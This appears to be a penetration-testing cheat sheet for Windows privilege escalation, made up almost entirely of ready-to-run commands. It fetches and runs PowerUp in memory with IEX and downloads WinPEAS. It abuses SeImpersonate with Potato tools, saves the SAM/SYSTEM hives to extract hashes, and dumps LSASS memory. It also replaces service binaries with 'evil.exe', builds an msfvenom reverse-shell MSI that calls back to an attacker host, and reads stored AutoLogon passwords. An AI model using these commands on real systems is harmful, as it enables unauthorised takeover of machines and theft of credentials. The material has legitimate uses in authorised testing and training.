# Windows Privilege Escalation

## Automated Enumeration
```bash
# From shell on target (upload and run):
# WinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe -o winpeas.exe
.\winpeas.exe

# PowerUp
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"

# Seatbelt
.\Seatbelt.exe -group=all
```

## Token-Based Escalation

### SeImpersonatePrivilege (most common)
```bash
# Check: whoami /priv | findstr "SeImpersonate"
# Available when running as: IIS/MSSQL/service accounts

# PrintSpoofer (Windows 10/Server 2016+)
PrintSpoofer.exe -i -c "cmd /c whoami"
PrintSpoofer.exe -i -c "powershell -ep bypass"

# GodPotato (Windows 8-11, Server 2012-2022)
GodPotato.exe -cmd "cmd /c whoami"

# JuicyPotato (Windows 7-10, Server 2008-2019)
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *

# SweetPotato
SweetPotato.exe -p cmd.exe -a "/c whoami"
```

### SeBackupPrivilege
```bash
# Can read any file including SAM/SYSTEM
reg save HKLM\SAM C:\Temp\sam.hiv
reg save HKLM\SYSTEM C:\Temp\system.hiv
# Extract hashes offline
impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
```

### SeDebugPrivilege
```bash
# Can dump LSASS memory
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Parse offline
pypykatz lsa minidump lsass.dmp
```

## Service Exploitation
```bash
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"

# Find weak service permissions
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv "Users" *
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# If writable service binary path:
sc qc SERVICENAME
# Replace binary and restart
sc stop SERVICENAME
copy evil.exe "C:\path\to\service.exe"
sc start SERVICENAME
```

## Registry-Based
```bash
# AlwaysInstallElevated (install MSI as SYSTEM)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1: msfvenom -p windows/shell_reverse_tcp LHOST=KALI LPORT=4444 -f msi -o evil.msi

# AutoLogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName

# Stored credentials
cmdkey /list
# If found: runas /savecred /user:Administrator "cmd.exe"
```

## Kernel Exploits
```bash
# Get system info
systeminfo > sysinfo.txt
# Check with windows-exploit-suggester
python3 windows-exploit-suggester.py --database 2026.xlsx --systeminfo sysinfo.txt

# Common kernel CVEs:
# CVE-2021-1732 (Win10 privesc)
# CVE-2021-36934 (HiveNightmare/SeriousSAM)
# CVE-2022-21882 (Win32k elevation)
```
